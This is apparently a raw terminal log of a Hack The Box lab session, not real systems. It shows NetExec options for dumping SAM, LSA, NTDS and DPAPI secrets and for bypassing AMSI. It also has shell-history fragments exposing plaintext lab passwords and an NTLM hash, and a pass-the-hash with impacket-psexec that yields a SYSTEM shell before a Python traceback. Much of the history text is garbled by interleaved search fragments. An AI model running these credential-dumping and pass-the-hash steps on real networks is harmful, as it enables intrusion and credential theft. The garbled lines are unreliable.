+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] username(s) or file(s) containing usernames
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] -p, --password PASSWORD [PASSWORD ...]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] password(s) or file(s) containing passwords
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] -id CRED_ID [CRED_ID ...]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] database credential ID(s) to use for authentication
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --ignore-pw-decoding  Ignore non UTF-8 characters when decoding the password file
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --no-bruteforce       No spray when using file for username and password (user1 => password1,
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] user2 => password2)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --continue-on-success
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] continues authentication attempts even after successes
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --gfail-limit LIMIT   max number of global failed login attempts
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --ufail-limit LIMIT   max number of failed login attempts per username
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --fail-limit LIMIT    max number of failed login attempts per host
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Kerberos Authentication:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] -k, --kerberos        Use Kerberos authentication
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --use-kcache          Use Kerberos authentication from ccache file (KRB5CCNAME)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --aesKey AESKEY [AESKEY ...]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] AES key to use for Kerberos Authentication (128 or 256 bits)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --kdcHost KDCHOST     FQDN of the domain controller. If omitted it will use the domain part
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] (FQDN) specified in the target parameter
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Certificate Authentication:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --pfx-cert PFXCERT    Use certificate authentication from pfx file .pfx
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --pfx-base64 PFXB64   Use certificate authentication from pfx file encoded in base64
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --pfx-pass PFXPASS    Password of the pfx certificate
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --pem-cert PEMCERT    Use certificate authentication from PEM file
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --pem-key PEMKEY      Private key for the PEM format
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Modules:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] -M, --module MODULE   module to use
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] -o MODULE_OPTION [MODULE_OPTION ...]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] module options
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] -L, --list-modules [LIST_MODULES]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] list available modules
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --options             display module options
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Credential Gathering:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --sam [{regdump,secdump}]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] dump SAM hashes from target systems
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --lsa [{regdump,secdump}]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] dump LSA secrets from target systems
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --ntds [{drsuapi,vss}]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] dump the NTDS.dit from target DCs using the specifed method
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --kerberos-keys       Also dump Kerberos AES and DES keys from target DC (NTDS.dit)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --history             Also retrieve password history from target DC (NTDS.dit)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --enabled             Only dump enabled targets from DC (NTDS.dit)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --user USERNTDS       Dump selected user from DC (NTDS.dit)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --dpapi [{nosystem,cookies} ...]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] dump DPAPI secrets from target systems, can dump cookies if you add
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] 'cookies', will not dump SYSTEM dpapi if you add nosystem
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --sccm [{wmi,disk}]   dump SCCM secrets from target systems
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --mkfile MKFILE       DPAPI option. File with masterkeys in form of {GUID}:SHA1
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --pvk PVK             DPAPI option. File with domain backupkey
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --list-snapshots [LIST_SNAPSHOTS]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Lists the VSS snapshots (default: ADMIN$)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Mapping/Enumeration:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --shares [SHARES]     Enumerate shares and access, filter on specified argument (read ; write ;
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] read,write)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --exclude-shares EXCLUDE_SHARES [EXCLUDE_SHARES ...]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --dir [DIR]           List the content of a path (default path: '')
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --interfaces          Enumerate network interfaces
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --no-write-check      Skip write check on shares (avoid leaving traces when missing delete
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] permissions)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --filter-shares FILTER_SHARES [FILTER_SHARES ...]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Filter share by access, option 'READ' 'WRITE' or 'READ,WRITE'
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --disks               Enumerate disks
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --users [USER ...]    Enumerate domain users, if a user is specified than only its information
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] is queried.
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --users-export USERS_EXPORT
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Enumerate domain users and export them to the specified file
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --groups [GROUP]      Enumerate domain groups, if a group is specified than its members are
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Enumerated
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --local-groups [GROUP]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Enumerate local groups, if a group is specified then its members are
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --computers [COMPUTER]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Enumerate computer users
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --pass-pol            dump password policy
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --rid-brute [MAX_RID]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Enumerate users by bruteforcing RIDs
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --smb-sessions        Enumerate active smb sessions
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --reg-sessions [REG_SESSIONS]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Enumerate users sessions using the Remote Registry. If a username is
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] given, filter for it. If a file is given, filter for listed usernames. If
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] no value is given, list all.
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --loggedon-users [LOGGEDON_USERS]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Enumerate logged on users, if a user is specified than a regex filter is
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] applied.
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --loggedon-users-filter LOGGEDON_USERS_FILTER
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] only search for specific user, works with regex
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --qwinsta [QWINSTA]   Enumerate user sessions. If a username is given, filter for it; if a file
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] is given, filter for listed usernames. If no value is given, list all.
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --tasklist [TASKLIST]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Enumerate running processes and filter for the specified one if specified
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --taskkill TASKKILL   Kills a specific PID or a proces name's PID's
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] WMI Queries:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --wmi-query QUERY     Issues the specified WMI query
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --wmi-namespace NAMESPACE
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] WMI Namespace (default: root\cimv2)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Spidering Shares:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --spider SHARE        share to spider
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --spider-folder FOLDER
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] folder to spider (default: .)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --content             enable file content searching
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --exclude-dirs DIR_LIST
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] directories to exclude from spidering
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --depth DEPTH         max spider recursion depth
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --only-files          only spider files
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --silent              Do not print found files/directories
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --pattern PATTERN [PATTERN ...]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] pattern(s) to search for in folders, filenames and file content
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --regex REGEX [REGEX ...]
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] regex(s) to search for in folders, filenames and file content
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] File Operations:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --put-file FILE FILE  Put a local file into remote target, ex: whoami.txt
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] \\Windows\\Temp\\whoami.txt
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --get-file FILE FILE  Get a remote file, ex: \\Windows\\Temp\\whoami.txt whoami.txt
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --append-host         append the host to the get-file filename
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Command Execution:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --exec-method {wmiexec,atexec,smbexec,mmcexec}
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] method to execute the command. Ignored if in MSSQL mode (default: wmiexec)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --dcom-timeout DCOM_TIMEOUT
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] DCOM connection timeout (default: 5)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --get-output-tries GET_OUTPUT_TRIES
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Number of times atexec/smbexec/mmcexec tries to get results (default: 10)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --codec CODEC         Set encoding used (codec) from the target's output. If errors are
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] detected, run chcp.com at the target & map the result with
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] https://docs.python.org/3/library/codecs.html#standard-encodings and then
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] execute again with --codec and the corresponding codec (default: utf-8)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --no-output           do not retrieve command output
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] -x COMMAND            execute the specified CMD command
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] -X PS_COMMAND         execute the specified PowerShell command
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] Powershell Script Obfuscation:
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --obfs                Obfuscate PowerShell scripts
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --amsi-bypass FILE    File with a custom AMSI bypass
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --clear-obfscripts    Clear all cached obfuscated PowerShell scripts
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --force-ps32          force PowerShell commands to run in a 32-bit process (may not apply to
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] modules)
+[2026-02-06 12:24:38] [w=2:tmux] [p=%2] [OUT] --no-encode           Do not encode the PowerShell command ran on target
+[2026-02-06 12:24:50] [w=2:tmux] [p=%2] [OUT] bck-i-search: _nxc smb 10.129.228.112 -u administrator -h 'e0fb1fb85756c24235ff238cbe81fe00'
+[2026-02-06 12:25:01] [w=2:tmux] [p=%2] [OUT] bck-i-search: n_nxnx_nxcc_c  _ ss_smm_mbb_hash 'e01fb85756c24235ff238cbe81fe00'bob -p 'lCEUnYPjNfIuPZSzOySA'                         administrator -p 'S1TjAtJHKsugh9oC4VZl'32.75 -u adam.silver -p 'Password123!'           steph.cooper -p 'ILY2025!'   note $ nxc smb 10.129.232.75 -u adam.silver -p 'Password123!' SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
+[2026-02-06 12:25:01] [w=2:tmux] [p=%2] [OUT] SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:Password123
+[2026-02-06 12:25:01] [w=2:tmux] [p=%2] [OUT] ! STATUS_ACCOUNT_DISABLED
+[2026-02-06 12:25:04] [w=2:tmux] [p=%2] [OUT] bck-i-search: nxc smb_nxc
+[2026-02-06 12:25:04] [w=2:tmux] [p=%2] [OUT] lver -p 'Password123!'
+[2026-02-06 12:25:11] [w=2:tmux] [p=%2] [OUT] jamie.williams -p 'JamieLove2025!'     Antman2025!'   ant.edwards -p 'An   dam.silverHJKL2025!'  levi.james -p 'KingofAkron2025!' -o SHARE='DEV-SHARE for PUPPY-DEVS'M shares -o SHARE='DEV-SHARE for PUPPY-DEVS'-shares                                     puppy.htb -k --lsa
+[2026-02-06 12:25:15] [w=2:tmux] [p=%2] [OUT] sam10.129.232.75 -k --sam --lsa     12.16 note used nxc smb 10.129.12.16 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!' --ntds --users to dump user hashes
+[2026-02-06 12:25:23] [w=2:tmux] [p=%2] [OUT] bck-i-search: nxc smb_usedoper_a     nxcadm -p                        r Administratoradministrator -p 'F   232.75 -u steph.cooper_adm -p 'ChefSteph2025!'                                 ChefSteph2025!   -p Ch    puppy_passwords.txt_adm -p 'steph2025!'   puppy_passwords.txt'ILY2025!'         Steve2025!' -p 'S    Administrator -p 'ILY2025!'
+[2026-02-06 12:25:24] [w=2:tmux] [p=%2] [OUT] 'Steve2025!'
+[2026-02-06 12:25:29] [w=2:tmux] [p=%2] [OUT] iiimpacket-smbserver share /home/b7h30/Documents/obsidian/docs/CTF/HTB/Jeeves/loot -smb2supportimimppaacckkeett--p
+[2026-02-06 12:25:30] [w=2:tmux] [p=%2] [OUT] sexec -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htbpsseec
+[2026-02-06 12:25:33] [w=2:tmux] [p=%2] [OUT] e xec -k -no-pass frizz.htb/f.frizzle@frizzdc.frizz.htbexxeecimpacket-psexecc c a
+[2026-02-06 12:25:44] [w=2:tmux] [p=%2] [OUT] dministrator@10.129.228.1
+[2026-02-06 12:25:45] [w=2:tmux] [p=%2] [OUT] 1
+[2026-02-06 12:26:06] [w=2:tmux] [p=%2] [OUT] 12 ---hhaasshheess s e0fb1fb85756c24235ff238cbe81fe00               impacket-psexec-hashes impacket-psexec-hashes    impacket-psexec-hashes impacket-psexec-hashes impacket-psexec-hashes impacket-psexec-hashes      impacket-psexec-hashes impacket-psexec-hashes  aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+[2026-02-06 12:26:06] [pane=%2] [CMD_START] impacket-psexec administrator@10.129.228.112 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+[2026-02-06 12:26:07] [w=2:tmux] [p=%2] [OUT] Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+[2026-02-06 12:26:08] [w=2:tmux] [p=%2] [OUT] [*] Requesting shares on 10.129.228.112.....
+[2026-02-06 12:26:08] [w=2:tmux] [p=%2] [OUT] [*] Found writable share ADMIN$
+[2026-02-06 12:26:08] [w=2:tmux] [p=%2] [OUT] [*] Uploading file tvnBDMgV.exe
+[2026-02-06 12:26:11] [w=2:tmux] [p=%2] [OUT] [*] Opening SVCManager on 10.129.228.112.....
+[2026-02-06 12:26:11] [w=2:tmux] [p=%2] [OUT] [*] Creating service wOdp on 10.129.228.112.....
+[2026-02-06 12:26:12] [w=2:tmux] [p=%2] [OUT] [*] Starting service wOdp.....
+[2026-02-06 12:26:14] [w=2:tmux] [p=%2] [OUT] [!] Press help for extra shell commands
+[2026-02-06 12:26:15] [w=2:tmux] [p=%2] [OUT] Microsoft Windows [Version 10.0.10586]
+[2026-02-06 12:26:15] [w=2:tmux] [p=%2] [OUT] (c) 2015 Microsoft Corporation. All rights reserved.
+[2026-02-06 12:26:18] [w=2:tmux] [p=%2] [OUT] C:\Windows\system32> whoami
+[2026-02-06 12:26:18] [w=2:tmux] [p=%2] [OUT] nt authority\system
+[2026-02-06 12:26:20] [w=2:tmux] [p=%2] [OUT] C:\Windows\system32> dir
+[2026-02-06 12:26:20] [w=2:tmux] [p=%2] [OUT]  Volume in drive C has no label.
+[2026-02-06 12:26:20] [w=2:tmux] [p=%2] [OUT] Volume Serial Number is 71A1-6FA1
+[2026-02-06 12:26:20] [w=2:tmux] [p=%2] [OUT] Directory of C:\Windows\system32
+[2026-02-06 12:26:20] [w=2:tmux] [p=%2] [OUT] 11/05/2017  09:15 PM    <DIR>          .
+[2026-02-06 12:26:20] [w=2:tmux] [p=%2] [OUT] 11/05/2017  09:15 PM    <DIR>          ..
+[2026-02-06 12:26:20] [w=2:tmux] [p=%2] [OUT] 10/30/2015  04:02 AM    <DIR>          0409
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM             2,151 12520437.cpx
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM             2,233 12520850.cpx
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM               760 @edptoastimage.png
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM               120 @TileEmpty1x1Image.png
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 10/04/2016  10:15 PM           129,536 AboveLockAppHost.dll
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM         3,789,824 accessibilitycpl.dll
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM            12,800 AccountsControlInternal.dll
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 03/29/2016  01:43 AM           358,400 AccountsRt.dll
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM            40,448 ACCTRES.dll
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM             9,216 acledit.dll
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM         5,391,360 aclui.dll
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM            46,080 acppage.dll
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:19 AM           259,072 ActionCenter.dll
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 06/30/2016  10:30 PM           546,816 ActionCenterCPL.dll
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM            27,648 ActivationClient.dll
+[2026-02-06 12:26:21] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM           225,280 activeds.dll
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM           112,640 activeds.tlb
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 03/03/2017  10:57 PM         1,708,032 ActiveSyncProvider.dll
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 04/22/2016  11:03 PM         2,193,408 actxprxy.dll
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM            54,272 AddressParser.dll
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 10/25/2016  12:47 AM           453,632 AdmTmpl.dll
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 11/05/2017  09:15 PM            51,200 admwprox.dll
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM            51,200 adprovider.dll
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 10/30/2015  04:07 AM           102,912 adrclient.dll
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM           224,768 adsldp.dll
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM           212,992 adsldpc.dll
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 10/04/2016  10:24 PM            88,576 adsmsext.dll
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM           291,328 adsnt.dll
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 09/06/2016  11:09 PM           824,832 adtschema.dll
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 10/26/2017  02:33 AM    <DIR>          AdvancedInstallers
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 09/14/2017  04:05 AM           499,432 advapi32.dll
+[2026-02-06 12:26:22] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM             3,072 advapi32res.dll
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM           112,640 advpack.dll
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM            30,720 aeevts.dll
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 11/05/2017  09:15 PM            26,112 ahadmin.dll
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:19 AM            19,456 amcompat.tlb
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM            37,376 amsi.dll
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM            82,944 amstream.dll
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 03/03/2017  11:48 PM           215,040 apds.dll
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM            36,352 APHostClient.dll
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 11/22/2016  02:54 AM            70,656 AppCapture.dll
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 05/27/2016  11:13 PM           467,456 AppContracts.dll
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 09/06/2016  11:32 PM           581,632 apphelp.dll
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM            31,232 Apphlpdm.dll
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 07/29/2017  04:26 PM            64,584 appidapi.dll
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 10/30/2015  04:07 AM           295,936 AppIdPolicyEngineApi.dll
+[2026-02-06 12:26:23] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:24 AM    <DIR>          AppLocker
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 07/29/2017  11:55 AM           250,880 AppLockerCSP.dll
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 10/30/2015  04:07 AM           165,376 appmgmts.dll
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 10/30/2015  04:07 AM           372,224 appmgr.dll
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 02/24/2016  01:32 AM            98,304 AppointmentActivation.dll
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 10/25/2016  12:35 AM           552,960 AppointmentApis.dll
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 09/05/2017  12:00 AM           190,976 apprepapi.dll
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 09/05/2017  12:02 AM           260,096 apprepsync.dll
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 10/25/2016  12:32 AM           738,816 appwiz.cpl
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 04/23/2016  12:02 AM           188,256 AppxAllUserStore.dll
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM           504,832 AppxApplicabilityEngine.dll
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 09/14/2017  01:03 AM           345,600 AppXDeploymentClient.dll
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 05/27/2016  11:11 PM           890,368 AppxPackaging.dll
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 04/18/2016  05:30 PM             2,186 AppxProvisioning.xml
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 02/24/2016  01:28 AM           135,168 AppxSip.dll
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:24 AM    <DIR>          ar-SA
+[2026-02-06 12:26:24] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:18 AM            23,040 ARP.EXE
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] 10/30/2015  02:19 AM             3,072 asferror.dll
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] Traceback (most recent call last):
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] File "/usr/share/doc/python3-impacket/examples/psexec.py", line 677, in <module>
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] executer.run(remoteName, options.target_ip)
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] File "/usr/share/doc/python3-impacket/examples/psexec.py", line 100, in run
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] self.doStuff(rpctransport)
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] File "/usr/share/doc/python3-impacket/examples/psexec.py", line 198, in doStuff
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] ans = s.readNamedPipe(tid,fid_main,8)
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 859, in readNamedPipe
+[2026-02-06 12:26:25] [w=2:tmux] [p=%2] [OUT] return self.readFile(treeId, fileId, bytesToRead = bytesToRead, singleCall = True)
